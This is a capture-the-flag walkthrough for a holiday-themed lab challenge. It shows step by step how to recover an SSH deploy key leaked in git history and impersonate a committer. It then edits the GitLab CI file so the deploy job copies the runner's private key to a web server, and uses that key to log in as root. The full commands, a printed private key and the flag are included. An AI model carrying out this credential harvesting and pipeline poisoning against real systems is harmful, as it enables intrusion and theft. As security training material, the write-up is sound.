---
sidebar_position: 3
---

# Jolly CI/CD

## Welcome screen

```bash
Greetings Noble Player, 

Many thanks for answering our desperate cry for help!

You may have heard that some evil Sporcs have opened up a web-store selling 
counterfeit banners and flags of the many noble houses found in the land of 
the North! They have leveraged some dastardly technology to power their 
storefront, and this technology is known as PHP! 

***gasp*** 

This strorefront utilizes a truly despicable amount of resources to keep the 
website up. And there is only a certain type of Christmas Magic capable of 
powering such a thing… an Elfen Ring!

Along with PHP there is something new we've not yet seen in our land. 
A technology called Continuous Integration and Continuous Deployment! 

Be wary! 

Many fair elves have suffered greatly but in doing so, they've managed to 
secure you a persistent connection on an internal network. 

BTW take excellent notes! 

Should you lose your connection or be discovered and evicted the 
elves can work to re-establish persistence. In fact, the sound off fans
and the sag in lighting tells me all the systems are booting up again right now.  

Please, for the sake of our Holiday help us recover the Ring and save Christmas!
```

## Helpfull hints

```
Commiting to Mistakes
From: Tinsel Upatree
Terminal: Jolly CI/CD
The thing about Git is that every step of development is accessible – even steps you didn't mean to take! git log can show code skeletons.
```

```
Switching Hats
From: Tinsel Upatree
Terminal: Jolly CI/CD
If you find a way to impersonate another identity, you might try re-cloning a repo with their credentials.
```

![Git hint](/img/elfen-ring/git-hint.png)


## Hacking CI/CD

From talking to Tinsel Upatree we get a link to a Gitlab repo (see screenshot above). Cloning it: 

```bash
grinchum-land:~$ git clone http://gitlab.flag.net.internal/rings-of-powder
Cloning into 'rings-of-powder'...
fatal: unable to update url base from redirection:
  asked for: http://gitlab.flag.net.internal/rings-of-powder/info/refs?service=git-upload-pack
   redirect: http://gitlab.flag.net.internal/users/sign_in
grinchum-land:~$
```

No access here. Trying the full link hinted by Upatree

```bash
grinchum-land:~$ git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
Cloning into 'wordpress.flag.net.internal'...
remote: Enumerating objects: 10195, done.
remote: Total 10195 (delta 0), reused 0 (delta 0), pack-reused 10195
Receiving objects: 100% (10195/10195), 36.49 MiB | 23.07 MiB/s, done.
Resolving deltas: 100% (1799/1799), done.
Updating files: 100% (9320/9320), done.
grinchum-land:~$
```

Looking at what I've cloned

```bash
grinchum-land:~/wordpress.flag.net.internal$ git status
fatal: detected dubious ownership in repository at '/home/samways/wordpress.flag.net.internal'
To add an exception for this directory, call:

        git config --global --add safe.directory /home/samways/wordpress.flag.net.internal
grinchum-land:~/wordpress.flag.net.internal$ git config --global --add safe.directory /home/samways/wordpress.flag.net.internal
grinchum-land:~/wordpress.flag.net.internal$ git status
On branch main
Your branch is up to date with 'origin/main'.

nothing to commit, working tree clean
grinchum-land:~/wordpress.flag.net.internal$
```

Looking at the Git commit log, there are ususally gold to be found in the log:

```bash
grinchum-land:~/wordpress.flag.net.internal$ git log
.
.
.

commit e19f653bde9ea3de6af21a587e41e7a909db1ca5
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 13:42:54 2022 -0700

    whoops

commit abdea0ebb21b156c01f7533cea3b895c26198c98
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 13:42:13 2022 -0700

    added assets
```

It appears user "knee-oh" made a happy little accident in commit abdea0ebb21b156c01f7533cea3b895c26198c98 and rectified it in commit e19f653bde9ea3de6af21a587e41e7a909db1ca5. Let's see what accident that was!

```bash
grinchum-land:~/wordpress.flag.net.internal$ git checkout abdea0ebb21b156c01f7533cea3b895c26198c98
HEAD is now at abdea0e added assets
grinchum-land:~/wordpress.flag.net.internal$ ls -la
total 48
drwxr-xr-x 5 samways users  4096 Dec 11 08:35 .
drwxr-xr-x 1 samways  1002  4096 Dec 11 08:26 ..
drwxr-xr-x 8 samways users  4096 Dec 11 08:36 .git
drwxr-xr-x 2 samways users  4096 Dec 11 08:35 .ssh
-rw-r--r-- 1 samways users 19915 Dec 11 08:24 license.txt
-rw-r--r-- 1 samways users  7401 Dec 11 08:24 readme.html
drwxr-xr-x 6 samways users  4096 Dec 11 08:24 wp-content
```

Oh - look at that! A .ssh folder, what's inside?

```bash
grinchum-land:~/wordpress.flag.net.internal$ ls -la .ssh/
total 16
drwxr-xr-x 2 samways users 4096 Dec 11 08:35 .
drwxr-xr-x 5 samways users 4096 Dec 11 08:35 ..
-rw-r--r-- 1 samways users  411 Dec 11 08:35 .deploy
-rw-r--r-- 1 samways users  102 Dec 11 08:35 .deploy.pub
```

Let's make use of this SSH key

```bash
grinchum-land:~/wordpress.flag.net.internal$ cp -r .ssh $HOME/
grinchum-land:~/wordpress.flag.net.internal$ chmod 700 $HOME/    
grinchum-land:~/wordpress.flag.net.internal$ chmod 700 $HOME/.ssh/
grinchum-land:~/wordpress.flag.net.internal$ chmod 644 $HOME/.ssh/.deploy.pub 
grinchum-land:~/wordpress.flag.net.internal$ chmod 600 $HOME/.ssh/.deploy
grinchum-land:~/wordpress.flag.net.internal$ touch $HOME/.ssh/config
```

I had to tell Git which private key to use by creating a config file and putting this as its content:

```
Host gitlab.flag.net.internal
  User git
  Hostname gitlab.flag.net.internal
  IdentityFile ~/.ssh/.deploy
```

Cloning the repository using SSH instead of HTTP:

```bash
grinchum-land:~$ git clone git@gitlab.flag.net.internal:/rings-of-powder/wordpress.flag.net.internal.git
```

Further impersonation, update the Git username and email settings (values grabbed from git log):

```bash
grinchum-land:~/wordpress.flag.net.internal$ git config --global user.name "knee-oh"
grinchum-land:~/wordpress.flag.net.internal$ git config --global user.email "sporx@kringlecon.com"
```

At this point it was tiresome to reproduce the steps above each time the terminal was reset, so I put my commands in a script to make things more efficient:

```bash
git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
cd wordpress.flag.net.internal
git checkout abdea0ebb21b156c01f7533cea3b895c26198c98
cp -r .ssh $HOME/
chmod 700 $HOME/    
chmod 700 $HOME/.ssh/
chmod 644 $HOME/.ssh/.deploy.pub 
chmod 600 $HOME/.ssh/.deploy
touch $HOME/.ssh/config
echo -e "Host gitlab.flag.net.internal\n\tUser git\n\tHostname gitlab.flag.net.internal\n\tIdentityFile ~/.ssh/.deploy" >> $HOME/.ssh/config
cd 
mv wordpress.flag.net.internal wordpress.flag.net.internal.bak 
git clone git@gitlab.flag.net.internal:/rings-of-powder/wordpress.flag.net.internal.git
git config --global user.name "knee-oh"
git config --global user.email "sporx@kringlecon.com"
```

Now, here's the meat. Inside the repositoriy there is a file .gitlab-ci.yml 

```bash
grinchum-land:~/wordpress.flag.net.internal$ cat .gitlab-ci.yml 
stages:
  - deploy

deploy-job:      
  stage: deploy 
  environment: production
  script:
    - rsync -e "ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy" --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/htm
```

This contains a command to run when deploying. If we look closer at it, it uses a SSH key (/etc/gitlab-runner/hhc22-wordpress-deploy). If we change the file to:

```bash
stages:
  - deploy

deploy-job:      
  stage: deploy 
  environment: production
  script:
    - rsync -e "ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy" --chown=www-data:www-data -atv --delete --progress /etc/gitlab-runner/hhc22-wordpress-deploy root@wordpress.flag.net.internal:/var/www/htm
```

The SSH key will be rsynced over to the webserver when the deployment runs. So lets commit the file above and retrieve the SSH key:

```bash
grinchum-land:~/wordpress.flag.net.internal$ wget wordpress.flag.net.internal/hhc22-wordpress-deploy
grinchum-land:~/wordpress.flag.net.internal$ cat hhc22-wordpress-deploy 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACD8EYdZTOpf5REuWXMb9FKCFWoiIX2HoU1aH90V0Ptq3wAAAJiMXr0BjF69
AQAAAAtzc2gtZWQyNTUxOQAAACD8EYdZTOpf5REuWXMb9FKCFWoiIX2HoU1aH90V0Ptq3w
AAAEBtNE6sqOFoqkmOhcB/9DgzaQhQRC/bwkAbsBXwqrt/mPwRh1lM6l/lES5Zcxv0UoIV
aiIhfYehTVof3RXQ+2rfAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
-----END OPENSSH PRIVATE KEY-----
grinchum-land:~/wordpress.flag.net.internal$
```

Success! Now ssh into the Wordpress server:

```bash
grinchum-land:~/wordpress.flag.net.internal$ chmod 600 hhc22-wordpress-deploy 
grinchum-land:~/wordpress.flag.net.internal$ ssh root@wordpress.flag.net.internal -i hhc22-wordpress-deploy
root@wordpress:~# ls /
bin  boot  dev  etc  flag.txt  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
root@wordpress:~# cd /  
root@wordpress:/# cat flag.txt
```

And the flag is: 

![Elfen ring flag](/img/elfen-ring/elfen-ring-flag.png)

Text value: oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT